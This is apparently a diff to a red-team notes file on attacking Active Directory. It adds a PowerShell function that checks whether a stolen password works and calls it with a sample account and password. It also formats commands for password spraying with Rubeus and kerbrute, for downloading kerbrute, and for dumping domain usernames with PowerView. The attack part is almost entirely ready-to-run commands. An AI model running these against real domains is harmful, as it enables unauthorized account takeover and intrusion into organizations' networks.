@@ -12,19 +12,38 @@ PS> .\ADRecon.ps1 -GenExcel .\ADRecon-Report-timestamp
 
 TODO: wget Excel file since Excel will not be installed
 
+## Check if the password is working
+`function Test-ADCredential {
+    [CmdletBinding()]
+    Param
+    (
+        [string]$UserName,
+        [string]$Password
+    )
+    if (!($UserName) -or !($Password)) {
+        Write-Warning 'Test-ADCredential: Please specify both user name and password'
+    } else {
+        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('domain')
+        $DS.ValidateCredentials($UserName, $Password)
+    }
+}`
+
+`Test-ADCredential -UserName printeradm -Password "x!3945jjlkJ2mN4QQ2"`
+
 # 2. Password Spraying
 ## Identify the standard domain password and start a password spray attack
 ### Use Rubeus
-PS> .\Rubeus.exe brute /password:Start123!
+`PS> .\Rubeus.exe brute /password:Start123!`
 
 ### Use Kerbrute
-PS> Invoke-WebRequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile ".\kerbrute.exe"
+`PS> Invoke-WebRequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile ".\kerbrute.exe"`
 
-PS> Import-Module .\PowerView.ps1
+`PS> Import-Module .\PowerView.ps1`
 
-PS> (Get-NetUser | select samAccountName).samAccountName > users.txt
+`PS> (Get-NetUser | select samAccountName).samAccountName > users.txt`
 
-PS> .\kerbrute.exe passwordspray --domain contoso.azure .\users.txt Start123!
+`PS> .\kerbrute.exe passwordspray --domain contoso.azure .\users.txt Start123!`
 
 ToDo error
 
